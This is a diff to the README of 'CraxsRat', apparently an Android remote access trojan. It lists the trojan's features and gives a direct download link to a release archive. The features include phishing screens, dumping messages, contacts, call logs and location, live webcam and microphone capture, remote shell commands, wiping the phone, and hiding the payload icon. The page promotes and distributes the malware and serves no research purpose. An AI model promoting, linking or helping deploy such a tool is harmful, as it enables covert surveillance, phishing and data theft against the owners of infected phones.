@@ -11,32 +11,33 @@
 ## Features
 Available For Rat
 
-- [ ]  Anti-Delete
-- [Screen Control ] Screen Control
-- [ ]  Format Phone
- Phone Call
- Message Toaster
- File Manager
- Screen Phisher
- Dump System Info
- Dump Location
- Live Webcam Stream
- Dump Messages
- Change Audio Mode
- Dump Call Logs
- Dump Local Time
- Microphone Recording
- Unistall App
- List Installed Apps
- Send Message
- Dump Contacts
- Lock/Unlock Screen
- Run Shell Command
- Webcam Snap
- Open App
- Install App
- Device Info
- Hide/Show payload app icon
+- [ ] Anti-Delete
+- [ ] Screen Control
+- [ ] Format Phone
+- [ ] Phone Call
+- [ ] Message Toaster
+- [ ] File Manager
+- [ ] Screen Phisher
+- [ ] Dump System Info
+- [ ] Dump Location
+- [ ] Live Webcam Stream
+- [ ] Dump Messages
+- [ ] Change Audio Mode
+- [ ] Dump Call Logs
+- [ ] Dump Local Time
+- [ ] Microphone Recording
+- [ ] Unistall App
+- [ ] List Installed Apps
+- [ ] Send Message
+- [ ] Dump Contacts
+- [ ] Lock/Unlock Screen
+- [ ] Run Shell Command
+- [ ] Webcam Snap
+- [ ] Open App
+- [ ] Install App
+- [ ] Device Info
+- [ ] Hide/Show payload app icon
+
 ## Download Drict Link 
 
 [Download](https://github.com/Ourmine0/CraxsRat/releases/download/Craxs_Rat/CraxsRat-V3@2023.zip)
